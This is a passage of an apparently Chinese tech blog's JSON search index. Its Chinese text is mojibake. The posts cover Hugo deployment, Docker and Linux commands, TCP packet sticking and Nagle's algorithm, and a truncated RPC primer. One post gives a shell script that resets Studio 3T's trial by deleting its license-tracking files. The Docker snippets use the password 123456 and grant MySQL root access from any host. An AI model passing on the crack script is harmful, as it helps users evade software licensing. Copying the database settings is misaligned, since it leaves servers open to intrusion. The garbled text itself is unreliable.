https://jekyllcn.com/docs/quickstart/","tags":["jekyll"],"categories":["åšå®¢"]},{"title":"hugoæ­å»ºåšå®¢","url":"%2Fp%2F74f76184.html","content":"\nåšå®¢ä¹‹å‰æ˜¯ç”¨ hexo æ¥æ­å»ºçš„, é—®ä¸ºä»€ä¹ˆè¦è½¬ç§»åˆ° hugo, å°±æ˜¯ä¸€ä¸ªå­—: å¤ªæ…¢.\n\nä½†æ˜¯é™¤äº†å¿«,  hexo å¥½å¤šç‰›é€¼çš„æ’ä»¶, hugo ç›®å‰è¿˜æ²¡æœ‰, ç„¶åæ¨¡æ¿ä¹Ÿæ¯”è¾ƒä¸‘.\n\n<!-- more -->\n\n# 1. å®‰è£…å’Œé…ç½®\n\n### 1.1 å®‰è£…Hugo\n\n```bash\n# å®‰è£… hugo\nbrew install hugo\n\n# åˆ›å»ºé¡¹ç›®\nhugo new site hugo-demo && cd hugo-demo \n\n# è®¾ç½®ä¸»é¢˜\ngit init\ngit submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/\necho 'theme = \"ananke\"' >> config.toml \n\n# æ–°å»ºæ–‡ç« \nhugo new posts/my-first-post.md\n\n# å¯åŠ¨ server é¢„è§ˆ\nhugo server\n```\n\nåœ¨æµè§ˆå™¨è¾“å…¥ `http://localhost:1313` å³å¯æŸ¥çœ‹æ•ˆæœ\n\nä½¿ç”¨å¦‚ä¸‹ä»£ç éƒ¨ç½²ç¼–è¯‘å®Œæˆçš„é™æ€é¡µé¢æ–‡ä»¶ï¼š\n\n```bash\nhugo -D\n```\n\n### 1.2 è…¾è®¯äº‘é™æ€éƒ¨ç½²\n\n> https://cloud.tencent.com/document/product/1210/43389\n\n```bash\nnpm install -g @cloudbase/cli\ntcb login\n\n# æ‚¨è¿˜æ²¡æœ‰å¼€å¯é™æ€ç½‘ç«™æœåŠ¡ï¼Œè¯·å…ˆåˆ°äº‘å¼€å‘æ§åˆ¶å°å¼€å¯é™æ€ç½‘ç«™æœåŠ¡ï¼\n#ğŸ‘‰ https://console.cloud.tencent.com/tcb\n\ncloudbase hosting deploy ./public  -e EnvID -r bj # æ­¤å¤„çš„ EnvID æ›¿æ¢ä¸ºè…¾è®¯äº‘CloudBaseç¯å¢ƒ ID, -r bj æ˜¯åŒ—äº¬\n```\n\n\n\n# 2. ä¸»é¢˜even\n\n```bash\ngit submodule add https://github.com/olOwOlo/hugo-theme-even.git themes/even\n\n\n# Take a look inside the exampleSite folder of this theme. You'll find a file called config.toml. To use it, copy the config.toml in the root folder of your Hugo site. Feel free to change it.\ncp themes/even/exampleSite/config.toml ./\n\n\n#  For this theme, you should use post instead of posts, namely hugo new post/some-content.md\nmv  content/posts/   content/post/\n```\n\n\n\n### 2.1 å›¾ç‰‡ç›¸å¯¹è·¯å¾„\n\nconfig.toml è®¾ç½®\n\n```ini\nuglyurls = true\n```\n\nå¦‚æœä¸è¡Œ, å†è®¾ç½®ç¯å¢ƒå˜é‡\n\n```bash\nexport HUGO_UGLYURLS=true\n```\n\n### 2.2 è¯„è®º\n\nconfig.toml è®¾ç½® valine çš„ id\n\n```ini\nparams.valine\n```\n\n### 2.3 å”¯ä¸€åœ°å€\n\nTODO: æ²¡æœ‰æ‰¾åˆ°`hexo-abbrlink`ç±»ä¼¼çš„æ’ä»¶, ä¸ºäº†å’Œä»¥å‰çš„åœ°å€å…¼å®¹, è¿˜æ˜¯ä¸€ä»¶éº»çƒ¦çš„äº‹æƒ….\n\n### 2.4 æœ¬åœ°æœç´¢\n\nTODO: æ²¡æ‰¾åˆ°ç®€å•çš„æ–¹æ¡ˆ\n\n\n\n# 3. é”™è¯¯\n\n### 3.1  tags è¯­æ³•é—®é¢˜\n\nexecuting \"_internal/schema.html\" at <.Params.tags>: range can't iterate over mongodb\n\ntags: mongodb  è¿™æ ·å°±ä¼šå¯¼è‡´ `tags` ä¸èƒ½è¿­ä»£ï¼Œéœ€è¦æ”¹æˆ `tags: [mongodb]` æ‰èƒ½è§£å†³è¿™ä¸ª Bugã€‚\n\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://cloud.tencent.com/document/product/1210/43389\n+ https://blog.lxdlam.com/post/9cc3283b/\n\n","tags":["hugo"],"categories":["åšå®¢"]},{"title":"å¸¸ç”¨dockerå¿«é€Ÿå¯åŠ¨å‘½ä»¤","url":"%2Fp%2F4aa4f44c.html","content":"\n# 1. mysql\n\n### 1.1 å¯åŠ¨5.7ç‰ˆæœ¬\n\n```bash\ndocker pull mysql:5.7\ndocker run -p 3306:3306 --name mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7\n```\n\n<!-- more -->\n\n### 1.2 å¯åŠ¨æœ€æ–°ç‰ˆæœ¬\n\n```bash\ndocker pull mysql:latest   \ndocker run -p 3307:3306 --name mysql_latest -e MYSQL_ROOT_PASSWORD=123456 -d mysql:latest\n```\n\nçœ‹æœ€æ–°ç‰ˆæœ¬å¯¹åº”çš„ç‰ˆæœ¬å·:\n\n```Â bash\ndocker run --rm mysql:latest mysql -V\n```\n\n\n\n### 1.3 å…è®¸å¤–ç½‘è¿æ¥\n\n```bash\ndocker exec -it mysql  /bin/bash\nmysql -u root -p\n\nALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY '12345678';\nGRANT ALL PRIVILEGES ON *.* TO 'root'@'%'  WITH GRANT OPTION;\nflush privileges;\n```\n\n\n\n# 2. redis\n\n### 2.1 å¯åŠ¨æœ€æ–°ç‰ˆæœ¬\n\n```bash\ndocker pull redis:latest\ndocker run -d --name redis -p 6379:6379 redis:latest  --requirepass \"123456\"\n```\n\nçœ‹æœ€æ–°ç‰ˆæœ¬å¯¹åº”çš„ç‰ˆæœ¬å·:\n\n```bash\ndocker run --rm redis:latest redis-cli -v\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["docker"],"categories":["docker"]},{"title":"linuxå¸¸è§è§£å†³æ–¹æ¡ˆ","url":"%2Fp%2F182cebe4.html","content":"\nè®°å½•ä¸€äº› linux å¸¸è§çš„é—®é¢˜è§£å†³æ–¹æ¡ˆ.\n\n### 1. ç”¨æˆ·åŠ åˆ° sudo ç”¨æˆ·ç»„\n\n```bash\nvi /etc/sudoers\n\n# å¯ä»¥çœ‹åˆ°æœ‰ä¸ª sudo ç”¨æˆ·ç»„\n# %sudo   ALL=(ALL:ALL) ALL\n```\n\n<!-- more -->\n\næ·»åŠ åˆ° sudoç»„\n\n```bash\nusermod -aG sudo <username>\n```\n\nå¯ä»¥çœ‹åˆ°, sudo ç»„æœ‰è¿™ä¸ªç”¨æˆ·äº†\n\n```bash\nvi /etc/group \n```\n\n\n\n### 2. å¿«é€Ÿæ‹·è´å…¬é’¥åˆ°æœåŠ¡å™¨\n\n```bash\nssh-copy-id -i ~/.ssh/fhyx.pub   liuwei@49.234.15.70\n```\n\n\n\n### 3. ssh configç›®å½•æƒé™\n\nBad owner or permissions on .ssh/configçš„è§£å†³æ–¹æ¡ˆ\n\n```bash\nchmod 600 ~/.ssh/config\nchown $USER ~/.ssh/config\n```\n\n\n\n### 4. æ¸…ç†ç£ç›˜\n\n```bash\nsudo df -h #æŸ¥çœ‹æœåŠ¡å™¨ç©ºé—´  \n\nsudo du -h --max-depth=1      #è¿™ä¸ªå‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰ç›®å½•ï¼Œå“ªä¸ªæ–‡ä»¶å ç”¨æœ€å¤§  \nsudo du -h --max-depth=1 | sort -nr   # æ’åº\nsudo du -sh *  #æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹å„æ–‡ä»¶åŠæ–‡ä»¶å¤¹å ç”¨å¤§å°  \n```\n\n","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"tcpç²˜åŒ…é—®é¢˜å’ŒNagleç®—æ³•","url":"%2Fp%2F6d39ef4c.html","content":"\n# 1. TCP ç²˜åŒ…\n\nç²˜åŒ…å¹¶ä¸æ˜¯ TCP åè®®é€ æˆçš„ï¼Œå®ƒçš„å‡ºç°æ˜¯å› ä¸ºåº”ç”¨å±‚åè®®è®¾è®¡è€…å¯¹ TCP åè®®çš„é”™è¯¯ç†è§£ï¼Œå¿½ç•¥äº† TCP åè®®çš„å®šä¹‰å¹¶ä¸”ç¼ºä¹è®¾è®¡åº”ç”¨å±‚åè®®çš„ç»éªŒã€‚æˆ‘ä»¬ç»å¸¸æåˆ°çš„ TCP åè®®ä¸­çš„ç²˜åŒ…æ˜¯å¦‚ä½•å‘ç”Ÿçš„ï¼š\n\n- TCP åè®®æ˜¯é¢å‘å­—èŠ‚æµçš„åè®®ï¼Œå®ƒå¯èƒ½ä¼šç»„åˆæˆ–è€…æ‹†åˆ†åº”ç”¨å±‚åè®®çš„æ•°æ®ï¼›\n- åº”ç”¨å±‚åè®®çš„æ²¡æœ‰å®šä¹‰æ¶ˆæ¯çš„è¾¹ç•Œå¯¼è‡´æ•°æ®çš„æ¥æ”¶æ–¹æ— æ³•æ‹¼æ¥æ•°æ®ï¼›\n\nTCPæœ¬æ¥å°±æ˜¯åŸºäºå­—èŠ‚æµè€Œä¸æ˜¯æ¶ˆæ¯åŒ…çš„åè®®ï¼Œä¼šæŠŠä½ çš„æ•°æ®å˜æˆå­—èŠ‚æµå‘åˆ°å¯¹é¢å»ï¼Œè€Œä¸”ä¿è¯é¡ºåºä¸ä¼šä¹±ï¼Œä½†æ˜¯ä½ è¦è‡ªå·±æå®šå­—èŠ‚æµè§£æã€‚\n\n<!-- more -->\n\n# 2. ç²˜åŒ…é—®é¢˜å¦‚ä½•å¤„ç†ï¼Ÿ\n\nç²˜åŒ…é—®é¢˜çš„æœ¬è´¨å°±æ˜¯æ— æ³•åŒºåˆ†æ•°æ®åŒ…çš„è¾¹ç•Œï¼Œåªè¦è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œä¹Ÿå°±è§£å†³äº†ç²˜åŒ…é—®é¢˜ã€‚\n\n### 2.1 å…³é—­Nagleç®—æ³•\n\nNagle ç®—æ³•ç¡®å®èƒ½å¤Ÿåœ¨æ•°æ®åŒ…è¾ƒå°æ—¶æé«˜ç½‘ç»œå¸¦å®½çš„åˆ©ç”¨ç‡å¹¶å‡å°‘ TCP å’Œ IP åè®®å¤´å¸¦æ¥çš„é¢å¤–å¼€é”€ï¼Œä½†æ˜¯ä½¿ç”¨è¯¥ç®—æ³•ä¹Ÿå¯èƒ½ä¼šå¯¼è‡´åº”ç”¨å±‚åè®®å¤šæ¬¡å†™å…¥çš„æ•°æ®è¢«åˆå¹¶æˆ–è€…æ‹†åˆ†å‘é€ï¼Œå½“æ¥æ”¶æ–¹ä» TCP åè®®æ ˆä¸­è¯»å–æ•°æ®æ—¶ä¼šå‘ç°ä¸ç›¸å…³çš„æ•°æ®å‡ºç°åœ¨äº†åŒä¸€ä¸ªæ•°æ®æ®µä¸­ï¼Œåº”ç”¨å±‚åè®®å¯èƒ½æ²¡æœ‰åŠæ³•å¯¹å®ƒä»¬è¿›è¡Œæ‹†åˆ†å’Œé‡ç»„ã€‚\n\nNagleç®—æ³•é—®é¢˜å¯¼è‡´çš„ï¼Œéœ€è¦ç»“åˆåº”ç”¨åœºæ™¯é€‚å½“å…³é—­è¯¥ç®—æ³•ã€‚\n\n### 2.2 æ¶ˆæ¯è¾¹ç•Œ\n\nå¦‚æœæˆ‘ä»¬èƒ½åœ¨åº”ç”¨å±‚åè®®ä¸­å®šä¹‰æ¶ˆæ¯çš„è¾¹ç•Œï¼Œé‚£ä¹ˆæ— è®º TCP åè®®å¦‚ä½•å¯¹åº”ç”¨å±‚åè®®çš„æ•°æ®åŒ…è¿›ç¨‹æ‹†åˆ†å’Œé‡ç»„ï¼Œæ¥æ”¶æ–¹éƒ½èƒ½æ ¹æ®åè®®çš„è§„åˆ™æ¢å¤å¯¹åº”çš„æ¶ˆæ¯ã€‚åœ¨åº”ç”¨å±‚åè®®ä¸­ï¼Œæœ€å¸¸è§çš„ä¸¤ç§è§£å†³æ–¹æ¡ˆå°±æ˜¯\n\n+ åŸºäºé•¿åº¦\n\n  åŸºäºé•¿åº¦çš„å®ç°æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ä½¿ç”¨å›ºå®šé•¿åº¦ï¼Œæ‰€æœ‰çš„åº”ç”¨å±‚æ¶ˆæ¯éƒ½ä½¿ç”¨ç»Ÿä¸€çš„å¤§å°ï¼Œå¦ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨ä¸å›ºå®šé•¿åº¦ï¼Œä½†æ˜¯éœ€è¦åœ¨åº”ç”¨å±‚åè®®çš„åè®®å¤´ä¸­å¢åŠ è¡¨ç¤ºè´Ÿè½½é•¿åº¦çš„å­—æ®µï¼Œè¿™æ ·æ¥æ”¶æ–¹æ‰å¯ä»¥ä»å­—èŠ‚æµä¸­åˆ†ç¦»å‡ºä¸åŒçš„æ¶ˆæ¯ï¼ŒHTTP åè®®çš„æ¶ˆæ¯è¾¹ç•Œå°±æ˜¯åŸºäºé•¿åº¦å®ç°çš„ã€‚\n\n  åœ¨ä¸Šè¿° HTTP æ¶ˆæ¯ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ Content-Length å¤´è¡¨ç¤º HTTP æ¶ˆæ¯çš„è´Ÿè½½å¤§å°ï¼Œå½“åº”ç”¨å±‚åè®®è§£æåˆ°è¶³å¤Ÿçš„å­—èŠ‚æ•°åï¼Œå°±èƒ½ä»ä¸­åˆ†ç¦»å‡ºå®Œæ•´çš„ HTTP æ¶ˆæ¯ï¼Œæ— è®ºå‘é€æ–¹å¦‚ä½•å¤„ç†å¯¹åº”çš„æ•°æ®åŒ…ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥éµå¾ªè¿™ä¸€è§„åˆ™å®Œæˆ HTTP æ¶ˆæ¯çš„é‡ç»„ã€‚\n\n+ åŸºäºç»ˆç»“ç¬¦ï¼ˆDelimiterï¼‰\n\n  ä¸è¿‡ HTTP åè®®é™¤äº†ä½¿ç”¨åŸºäºé•¿åº¦çš„æ–¹å¼å®ç°è¾¹ç•Œï¼Œä¹Ÿä¼šä½¿ç”¨åŸºäºç»ˆç»“ç¬¦çš„ç­–ç•¥ï¼Œå½“ HTTP ä½¿ç”¨å—ä¼ è¾“ï¼ˆChunked Transferï¼‰æœºåˆ¶æ—¶ï¼ŒHTTP å¤´ä¸­å°±ä¸å†åŒ…å« Content-Length äº†ï¼Œå®ƒä¼šä½¿ç”¨è´Ÿè½½å¤§å°ä¸º 0 çš„ HTTP æ¶ˆæ¯ä½œä¸ºç»ˆç»“ç¬¦è¡¨ç¤ºæ¶ˆæ¯çš„è¾¹ç•Œã€‚\n\n  è¿˜æœ‰ä¾‹å¦‚\\nï¼Œ\\rï¼Œ\\tï¼Œæˆ–è€…ä¸€äº›éšè—å­—ç¬¦ã€‚\n\nå½“ç„¶é™¤äº†è¿™ä¸¤ç§æ–¹å¼ä¹‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºç‰¹å®šçš„è§„åˆ™å®ç°æ¶ˆæ¯çš„è¾¹ç•Œï¼Œä¾‹å¦‚ï¼šä½¿ç”¨ TCP åè®®å‘é€ JSON æ•°æ®ï¼Œæ¥æ”¶æ–¹å¯ä»¥æ ¹æ®æ¥æ”¶åˆ°çš„æ•°æ®æ˜¯å¦èƒ½å¤Ÿè¢«è§£ææˆåˆæ³•çš„ JSON åˆ¤æ–­æ¶ˆæ¯æ˜¯å¦ç»ˆç»“ã€‚\n\n\n\n# 3. Nagleç®—æ³•å’Œå»¶è¿Ÿç¡®è®¤\n\n### 3.1 Nagleç®—æ³•\n\nå°æ•°æ®å—å­˜åœ¨ä¸€èµ·ï¼Œä¸€èµ·å‘é€ã€‚\n\nï¼ˆ1ï¼‰å¦‚æœåŒ…é•¿åº¦è¾¾åˆ°MSSï¼Œåˆ™å…è®¸å‘é€ï¼›\n\nï¼ˆ2ï¼‰å¦‚æœè¯¥åŒ…å«æœ‰FINï¼Œåˆ™å…è®¸å‘é€ï¼›\n\nï¼ˆ3ï¼‰è®¾ç½®äº†TCP_NODELAYé€‰é¡¹ï¼Œåˆ™å…è®¸å‘é€ï¼›\n\nï¼ˆ4ï¼‰æœªè®¾ç½®TCP_CORKé€‰é¡¹æ—¶ï¼Œè‹¥æ‰€æœ‰å‘å‡ºå»çš„å°æ•°æ®åŒ…ï¼ˆåŒ…é•¿åº¦å°äºMSSï¼‰å‡è¢«ç¡®è®¤ï¼Œåˆ™å…è®¸å‘é€ï¼›\n\nï¼ˆ5ï¼‰ä¸Šè¿°æ¡ä»¶éƒ½æœªæ»¡è¶³ï¼Œä½†å‘ç”Ÿäº†è¶…æ—¶ï¼ˆä¸€èˆ¬ä¸º200msï¼‰ï¼Œåˆ™ç«‹å³å‘é€ã€‚\n\n\n\n+ ä¼˜ç‚¹ï¼šé¿å…ç½‘ç»œä¸­å……æ–¥ç€è®¸å¤šå°æ•°æ®å—ï¼Œé™ä½ç½‘ç»œè´Ÿè½½ï¼Œå‡å°‘ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç½‘ç»œååã€‚\n\n+ ç¼ºç‚¹ï¼šå®¢æˆ·ç«¯çš„å»¶è¿Ÿä¼šå¢åŠ ï¼Œå®æ—¶æ€§é™ä½ï¼Œä¸é€‚åˆå»¶æ—¶è¦æ±‚å°½é‡å°çš„åœºæ™¯ï¼›ä¸”å¯¹äºå¤§æ–‡ä»¶ä¼ è¾“è¿™ç§åœºæ™¯ï¼Œä¼šé™ä½ä¼ è¾“é€Ÿåº¦ã€‚\n\nç”¨TCP_NODELAYé€‰é¡¹å¯ä»¥ç¦æ­¢Negale ç®—æ³•ã€‚æ­¤æ—¶ï¼Œåº”ç”¨ç¨‹åºå‘å†…æ ¸é€’äº¤çš„æ¯ä¸ªæ•°æ®åŒ…éƒ½ä¼šç«‹å³å‘é€å‡ºå»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ç¦æ­¢äº†Negale ç®—æ³•ï¼Œä½†ç½‘ç»œçš„ä¼ è¾“ä»ç„¶å—åˆ°TCPç¡®è®¤å»¶è¿Ÿæœºåˆ¶çš„å½±å“ã€‚\n\n### 3.2 å»¶è¿Ÿç¡®è®¤\n\næ¥æ”¶æ–¹åœ¨æ”¶åˆ°æ•°æ®åï¼Œå¹¶ä¸ä¼šç«‹å³å›å¤ACK, è€Œæ˜¯å»¶è¿Ÿä¸€å®šæ—¶é—´ æˆ–è€… è¾¾åˆ°2xæœ€å¤§æ®µæ•°æ®é•¿åº¦ä¸ºæ­¢ (ä¸åŒæ“ä½œç³»ç»Ÿå®ç°å¹¶ä¸ä¸€æ ·)\n\n1. è¿™æ ·åšçš„ç›®çš„æ˜¯ACKæ˜¯å¯ä»¥åˆå¹¶çš„ï¼Œä¹Ÿå°±æ˜¯æŒ‡å¦‚æœè¿ç»­æ”¶åˆ°ä¸¤ä¸ªTCPåŒ…ï¼Œå¹¶ä¸ä¸€å®šéœ€è¦ACKä¸¤æ¬¡ï¼Œåªè¦å›å¤æœ€ç»ˆçš„ACKå°±å¯ä»¥äº†ï¼Œå¯ä»¥é™ä½ç½‘ç»œæµé‡ã€‚\n2. å¦‚æœæ¥æ”¶æ–¹æœ‰æ•°æ®è¦å‘é€ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨å‘é€æ•°æ®çš„TCPæ•°æ®åŒ…é‡Œï¼Œå¸¦ä¸ŠACKä¿¡æ¯ã€‚è¿™æ ·åšï¼Œå¯ä»¥é¿å…å¤§é‡çš„ACKä»¥ä¸€ä¸ªå•ç‹¬çš„TCPåŒ…å‘é€ï¼Œå‡å°‘äº†ç½‘ç»œæµé‡ã€‚\n\n\n### 3.3 Nagleå’Œå»¶è¿Ÿç¡®è®¤ä¸€èµ·ä½¿ç”¨äº§ç”Ÿçš„é—®é¢˜\n\nä¸¤ç§ç®—æ³•ä¼˜ç‚¹éƒ½æœ‰å‡å°ç½‘ç»œæ•°æ®åŒ…çš„ä¼˜ç‚¹ï¼Œä½†æ˜¯éƒ½å¢åŠ äº†ç½‘ç»œé€šä¿¡çš„å»¶æ—¶. ç»“åˆåœ¨ä¸€èµ·å°±ä¼šæœ‰é—®é¢˜\n\nä¾‹å¦‚å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªæ•°æ®æŠ¥, ç”±äºå»¶æ—¶ç¡®è®¤ï¼ŒæœåŠ¡ç«¯ä¸æ˜¯é©¬ä¸Šç¡®è®¤ï¼›\n\nè‹¥å®¢æˆ·ç«¯å¯ç”¨nagleç®—æ³•ï¼Œè¦ç­‰åˆ°æ”¶åˆ°ä¸Šä¸€ä¸ªæ•°æ®æŠ¥çš„ç¡®è®¤åœ¨å‘é€ä¸‹ä¸€ä¸ªæ•°æ®æŠ¥ï¼›\n\nå¦‚æ­¤ä»¥æ¥ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç›¸äº’ç­‰å¾…ï¼Œç›´åˆ°è¶…æ—¶æˆ–è€…å…¶ä»–æƒ…å†µ.\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/20210025\n\n+ https://draveness.me/whys-the-design-tcp-message-frame/","tags":["tcp"],"categories":["ç½‘ç»œ"]},{"title":"macä¸‹studio3Tç ´è§£ä½¿ç”¨","url":"%2Fp%2F894da3bb.html","content":"\n# 1. æ— é™è¯•ç”¨è„šæœ¬\n\nä»…é’ˆå¯¹macç³»ç»Ÿã€‚ä»¥ä¸‹è„šæœ¬å¤åˆ¶ä¸ºshellæ–‡ä»¶ï¼Œæ‰§è¡Œåï¼Œé‡å¯macç”µè„‘å³å¯ã€‚\n\n```bash\n#!/bin/sh\n# ç ´è§£3T-Studioæ™‚é–“é™åˆ¶ https://www.cnblogs.com/dzqdzq/p/11261419.html\n\nrm -f ~/Library/Preferences/3t.*\nrm -rf ~/.3T\nrm -rf ~/.cache/ftuwWNWoJl-STeZhVGHKkQ--\n\nftPath=`find /var/folders -name \"ftuwWNWoJl-STeZhVGHKkQ--\" -print 2>&1 | fgrep -v \"Permission denied\" | fgrep -v \"Operation not permitted\"`\nt3Path=`dirname ${ftPath}`/t3\n\nif [ -e ${ftPath} ];then\n    rm -rf ${ftPath}\nfi\n\nif [ -e ${t3Path} ];then\n    rm -rf ${t3Path}\nfi\n\necho \"åˆ é™¤æ¡£æ¡ˆæˆåŠŸï¼Œè¯·ç«‹å³é‡å¯ç”µè„‘ç”Ÿæ•ˆ\"\necho \"å¦‚æœä¸æƒ³ç«‹åˆ»é‡å¯ï¼Œé‚£ä¹ˆè¯·åœ¨é‡å¯ç”µè„‘å‰ï¼Œéƒ½ä¸è¦é‡æ–°æ‰§è¡Œstudio3T, å¦åˆ™æ‰§è¡ŒæŒ‡ä»¤ç å°†ä¸èµ·ä½œç”¨\"\n```\n\n","tags":["mongo"],"categories":["è½¯ä»¶"]},{"title":"rpcçš„ä»‹ç»","url":"%2Fp%2F317a11e.html","content":"\n\n\n\n# 1. RPCï¼ˆRemote Procedure Callï¼‰è¿œç¨‹è¿‡ç¨‹è°ƒç”¨\n\nåœ¨åˆ†å¸ƒå¼è®¡ç®—ï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆè‹±è¯­ï¼šRemote Procedure Callï¼Œç¼©å†™ä¸º RPCï¼‰æ˜¯ä¸€ä¸ªè®¡ç®—æœºé€šä¿¡åè®®ã€‚è¯¥åè®®å…è®¸è¿è¡Œäºä¸€å°è®¡ç®—æœºçš„ç¨‹åºè°ƒç”¨å¦ä¸€ä¸ªåœ°å€ç©ºé—´ï¼ˆé€šå¸¸ä¸ºä¸€ä¸ªå¼€æ”¾ç½‘ç»œçš„ä¸€å°è®¡ç®—æœºï¼‰çš„å­ç¨‹åºï¼Œè€Œç¨‹åºå‘˜å°±åƒè°ƒç”¨æœ¬åœ°ç¨‹åºä¸€æ ·ï¼Œæ— éœ€é¢å¤–åœ°ä¸ºè¿™ä¸ªäº¤äº’ä½œç”¨ç¼–ç¨‹ï¼ˆæ— éœ€å…³æ³¨ç»†èŠ‚ï¼‰ã€‚RPCæ˜¯ä¸€ç§æœåŠ¡å™¨-å®¢æˆ·ç«¯ï¼ˆClient/Serverï¼‰æ¨¡å¼ï¼Œç»å…¸å®ç°æ˜¯ä¸€ä¸ªé€šè¿‡å‘é€è¯·æ±‚-æ¥å—å›åº”è¿›è¡Œä¿¡æ¯äº¤äº’çš„ç³»ç»Ÿã€‚\n\n![1](rpcçš„ä»‹ç»/4.jpg)\n\n<!-- more -->\n\n\n### 1.1 å¸¸è§çš„ RPCæ¡†æ¶\n\nRPC æ˜¯ä¸€ç§æŠ€æœ¯æ€æƒ³è€Œéä¸€ç§è§„èŒƒæˆ–åè®®ï¼Œå¸¸è§ RPCæ¡†æ¶æœ‰ï¼š\n\n[Dubbo](http://dubbo.io/) æ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€ä¸ªJavaé«˜æ€§èƒ½ä¼˜ç§€çš„æœåŠ¡æ¡†æ¶ï¼Œä½¿å¾—åº”ç”¨å¯é€šè¿‡é«˜æ€§èƒ½çš„ RPC å®ç°æœåŠ¡çš„è¾“å‡ºå’Œè¾“å…¥åŠŸèƒ½ï¼Œå¯ä»¥å’Œ Springæ¡†æ¶æ— ç¼é›†æˆã€‚\n\n[Motan](https://github.com/weibocom/motan)æ˜¯æ–°æµªå¾®åšå¼€æºçš„ä¸€ä¸ªJava æ¡†æ¶ã€‚å®ƒè¯ç”Ÿçš„æ¯”è¾ƒæ™šï¼Œèµ·äº2013å¹´ï¼Œ2016å¹´5æœˆå¼€æºã€‚Motan åœ¨å¾®åšå¹³å°ä¸­å·²ç»å¹¿æ³›åº”ç”¨ï¼Œæ¯å¤©ä¸ºæ•°ç™¾ä¸ªæœåŠ¡å®Œæˆè¿‘åƒäº¿æ¬¡çš„è°ƒç”¨ã€‚\n\n[rpcx](https://github.com/smallnest/rpcx)æ˜¯Goè¯­è¨€ç”Ÿæ€åœˆçš„Dubboï¼Œ æ¯”Dubboæ›´è½»é‡ï¼Œå®ç°äº†Dubboçš„è®¸å¤šç‰¹æ€§ï¼Œå€ŸåŠ©äºGoè¯­è¨€ä¼˜ç§€çš„å¹¶å‘ç‰¹æ€§å’Œç®€æ´è¯­æ³•ï¼Œå¯ä»¥ä½¿ç”¨è¾ƒå°‘çš„ä»£ç å®ç°åˆ†å¸ƒå¼çš„RPCæœåŠ¡ã€‚\n\n[gRPC](http://www.grpc.io/)æ˜¯Googleå¼€å‘çš„é«˜æ€§èƒ½ã€é€šç”¨çš„å¼€æºRPCæ¡†æ¶ï¼Œå…¶ç”±Googleä¸»è¦é¢å‘ç§»åŠ¨åº”ç”¨å¼€å‘å¹¶åŸºäºHTTP/2åè®®æ ‡å‡†è€Œè®¾è®¡ï¼ŒåŸºäºProtoBuf(Protocol Buffers)åºåˆ—åŒ–åè®®å¼€å‘ï¼Œä¸”æ”¯æŒä¼—å¤šå¼€å‘è¯­è¨€ã€‚æœ¬èº«å®ƒä¸æ˜¯åˆ†å¸ƒå¼çš„ï¼Œæ‰€ä»¥è¦å®ç°ä¸Šé¢çš„æ¡†æ¶çš„åŠŸèƒ½éœ€è¦è¿›ä¸€æ­¥çš„å¼€å‘ã€‚\n\n[thrift](https://thrift.apache.org/)æ˜¯Apacheçš„ä¸€ä¸ªè·¨è¯­è¨€çš„é«˜æ€§èƒ½çš„æœåŠ¡æ¡†æ¶ï¼Œä¹Ÿå¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ã€‚\n\n|æ¡†æ¶| Dubbo            | Montan | rpcx                              | gRPC |\n| :--------------- | :----- | :-------------------------------- | :--- | :----------------- |\n| å¼€å‘è¯­è¨€         | Java   | Java                              | Go   | è·¨è¯­è¨€             |\n| åˆ†å¸ƒå¼(æœåŠ¡æ²»ç†) | âˆš      | âˆš                                 | âˆš    | Ã—                  |\n| å¤šåºåˆ—åŒ–æ¡†æ¶æ”¯æŒ | âˆš      | âˆš (å½“å‰æ”¯æŒHessian2ã€Json,å¯æ‰©å±•) | âˆš    | Ã— (åªæ”¯æŒprotobuf) |\n| å¤šç§æ³¨å†Œä¸­å¿ƒ     | âˆš      | âˆš                                 | âˆš    | Ã—                  |\n| ç®¡ç†ä¸­å¿ƒ         | âˆš      | âˆš                                 | âˆš    | Ã—                  |\n| è·¨ç¼–ç¨‹è¯­è¨€       | Ã—      | Ã— (æ”¯æŒphp clientå’ŒC server)      | Ã—    | âˆš                  |\n\n### 1.2 å®Œæ•´çš„ RPC æ¡†æ¶\n\nåœ¨ä¸€ä¸ªå…¸å‹ RPC çš„ä½¿ç”¨åœºæ™¯ä¸­ï¼ŒåŒ…å«äº†æœåŠ¡å‘ç°ã€è´Ÿè½½ã€å®¹é”™ã€ç½‘ç»œä¼ è¾“ã€åºåˆ—åŒ–ç­‰ç»„ä»¶ï¼Œå…¶ä¸­â€œRPC åè®®â€å°±æŒ‡æ˜äº†ç¨‹åºå¦‚ä½•è¿›è¡Œç½‘ç»œä¼ è¾“å’Œåºåˆ—åŒ–ã€‚\n\n![1](rpcçš„ä»‹ç»/1.jpg)\n\n### 1.3 RPC æ ¸å¿ƒä¹‹åŠŸèƒ½å®ç°\n\næ‰€ä»¥ï¼Œè¦å®ç°ä¸€ä¸ª RPC æ¡†æ¶ï¼Œåªéœ€è¦æŠŠä»¥ä¸‹ä¸‰ç‚¹å®ç°äº†å°±åŸºæœ¬å®Œæˆäº†ï¼š\n\n- æœåŠ¡å¯»å€Call ID æ˜ 